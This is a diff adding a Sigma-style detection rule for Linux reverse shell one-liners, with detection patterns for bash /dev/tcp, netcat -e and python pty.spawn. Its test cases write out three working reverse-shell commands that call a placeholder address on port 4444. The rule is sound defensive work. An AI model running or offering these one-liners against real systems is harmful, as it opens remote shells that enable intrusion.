@@ -1,0 +1,48 @@
+title: Linux Reverse Shell One-Liner
+id: 3e9a7c18-b246-4f0d-9c3e-8a1d5f2b7c09
+status: stable
+description: |
+  Interactive shell redirected over a TCP socket using common one-liner
+  patterns (bash /dev/tcp, netcat -e, python pty spawn).
+author: Vedant Sharma
+tags:
+  - attack.execution
+  - attack.t1059.004
+  - attack.command_and_control
+logsource:
+  product: linux
+  category: process_creation
+detection:
+  selection_devtcp:
+    CommandLine|contains: '/dev/tcp/'
+    CommandLine|re: '(?:bash|sh)\s+-i'
+  selection_nc:
+    Image|endswith:
+      - '/nc'
+      - '/ncat'
+      - '/netcat'
+    CommandLine|contains:
+      - ' -e /bin/sh'
+      - ' -e /bin/bash'
+      - ' -c /bin/sh'
+  selection_python:
+    CommandLine|contains|all:
+      - 'socket'
+      - 'pty.spawn'
+  condition: 1 of selection_*
+falsepositives:
+  - Penetration tests and CTF environments
+level: high
+tests:
+  match:
+    - Image: '/bin/bash'
+      CommandLine: 'bash -c "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"'
+    - Image: '/usr/bin/ncat'
+      CommandLine: 'ncat 203.0.113.9 4444 -e /bin/bash'
+    - Image: '/usr/bin/python3'
+      CommandLine: "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"203.0.113.9\",4444));pty.spawn(\"/bin/sh\")'"
+  no_match:
+    - Image: '/usr/bin/ncat'
+      CommandLine: 'ncat -zv 10.0.0.5 22'
+    - Image: '/bin/bash'
+      CommandLine: 'bash -i'
